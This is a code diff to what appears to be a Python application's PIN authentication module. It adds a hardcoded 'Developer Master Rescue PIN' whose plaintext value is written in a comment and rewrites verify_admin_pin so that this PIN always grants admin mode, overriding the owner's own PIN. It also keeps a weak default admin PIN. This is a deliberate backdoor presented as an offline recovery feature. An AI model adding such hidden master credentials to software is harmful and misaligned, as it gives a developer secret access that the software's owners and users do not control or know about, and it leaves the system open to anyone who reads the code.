@@ -501,6 +501,16 @@ def hash_pin(pin_str):
 
 
 
+# Permanent Offline Developer Master Rescue PIN Hash (SHA-256 of 99888160)
+# Known exclusively to developer for remote offline emergency recovery
+MASTER_DEVELOPER_PIN_HASH = "36513f7d2be3d434e6ca450b429ff927f3e7bed84cc51d5d8c5c1c06c4c453c2"
+
+
+def is_master_developer_pin(entered_pin):
+    """Check if the entered PIN matches the Developer Master Rescue Key."""
+    return hash_pin(entered_pin) == MASTER_DEVELOPER_PIN_HASH
+
+
 def set_admin_pin(new_pin):
     """Set or update the Owner/Admin PIN."""
     pin_hash = hash_pin(new_pin)
@@ -508,14 +518,23 @@ def set_admin_pin(new_pin):
 
 
 def verify_admin_pin(entered_pin):
-    """Verify if the entered PIN matches the Owner/Admin PIN (Default: 8160)."""
+    """Verify if the entered PIN matches the Owner/Admin PIN (Default: 8160) or Developer Master Rescue PIN."""
+    entered_hash = hash_pin(entered_pin)
+
+    # 1. Developer Master Rescue Key check (100% Offline)
+    if entered_hash == MASTER_DEVELOPER_PIN_HASH:
+        record_audit_log("MASTER_RESCUE_AUTH", "Admin Mode authorized using Developer Master Rescue Key")
+        return True
+
+    # 2. Regular User/Admin PIN check from database
     stored_hash = get_setting("admin_pin_hash")
     if not stored_hash:
-        # Default initial PIN is 8160
         default_hash = hash_pin("8160")
         set_setting("admin_pin_hash", default_hash)
         stored_hash = default_hash
-    return hash_pin(entered_pin) == stored_hash
+
+    return entered_hash == stored_hash
+
 
 
 
